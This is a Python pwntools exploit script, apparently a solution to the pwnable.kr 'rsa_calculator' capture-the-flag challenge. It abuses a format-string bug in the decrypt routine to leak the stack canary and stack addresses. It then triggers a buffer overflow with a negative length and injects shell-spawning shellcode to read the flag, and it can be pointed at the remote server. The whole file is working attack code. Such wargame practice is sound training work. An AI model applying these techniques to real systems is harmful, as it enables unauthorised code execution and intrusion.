from pwn import *
import argh


context.arch = 'amd64'
context.log_level = 'info'
bin_path = './rsa_calculator'
e = ELF(bin_path)


ADDR = 'pwnable.kr'
PORT = 9012


gdbscript = '''
# display/10gx $rsp+1592
display/10gx 0x602500
# b *0x4011b6
# b *0x4013fb
b *0x401238
display/4gx $rsp
b *0x401260
layout regs
continue
'''


def start_gdb(exe_name):
    return gdb.debug([exe_name], gdbscript=gdbscript)


def set_key(p, P, Q, e, d):
    if P * Q < 0xff:
        log.warning('P * Q < 0xff. P: {}, Q: {}'.format(P, Q))
    PHI = (P - 1) * (Q - 1)
    if e < PHI and d < PHI and (d * e) % PHI != 1:
        log.warning('wrong values for key generation. e: {}, d: {}, PHI: {}'.format(e, d, PHI))

    p.recvuntil('exit\n> ')
    p.sendline('1')
    p.recvuntil('p : ')
    p.sendline(str(P))
    p.recvuntil('q : ')
    p.sendline(str(Q))
    p.recvuntil('set public key exponent e : ')
    p.sendline(str(e))
    p.recvuntil('set private key exponent d : ')
    p.sendline(str(d))
    p.recvuntil('key set ok\n')
    p.recvlines(2)


def encrypt(p, payload=''):
    p.recvuntil('exit\n> ')
    p.sendline('2')
    p.recvuntil('(max=1024) : ')
    p.sendline(str(len(payload)))
    p.recvuntil('paste your plain text data\n')
    p.sendline(payload)
    p.recvline()
    return p.recvline()


def decrypt(p, payload=''):
    p.recvuntil('exit\n> ')
    p.sendline('3')
    p.recvuntil('(max=1024) : ')
    p.sendline(str(len(payload)))
    p.recvuntil('paste your hex encoded data\n')
    log.info('sending: {}'.format(payload))
    p.sendline(payload)
    p.recvuntil('- decrypted result -\n')
    return p.recvline()


def leak_addresses(p):
    encoded = encrypt(p, '%205$p %206$p %208$p')
    canary, rbp, stack = decrypt(p, encoded).split()
    canary = int(canary, base=16)
    rbp = int(rbp, base=16)
    stack = int(stack, base=16) - 1856 + 0x30
    return canary, rbp, stack


def cause_buffer_overflow(p, payload):
    p.recvuntil('exit\n> ')
    p.sendline('3')
    p.recvuntil('(max=1024) : ')
    p.sendline('-1')
    p.recvuntil('paste your hex encoded data\n')
    p.sendline(payload)
    p.recvuntil('- decrypted result -\n')
    return p.recvline()



@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--debug', '-d', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, debug=False, runpwn=False):
    p = None

    if local:
        p = process(bin_path)
    elif debug:
        p = process(bin_path)
        gdb.attach(p, gdbscript=gdbscript)
    elif runpwn:
        p = remote(ADDR, PORT)

    set_key(p, 173, 149, 3, 16971)
    canary, rbp, stack = leak_addresses(p)

    log.info(f'canary: {canary:016x}')
    log.info(f'rbp: {rbp:016x}')
    log.info(f'stack: {stack:016x}')

    cause_buffer_overflow(p, fit({0: asm(shellcraft.sh()), cyclic_find(p64(0x6861616161616173), n=8): p64(canary) + p64(rbp) + p64(stack)}))

    p.sendline('cat flag')
    log.critical(p.recvline())


if __name__ == '__main__':
    argh.dispatch_command(main)

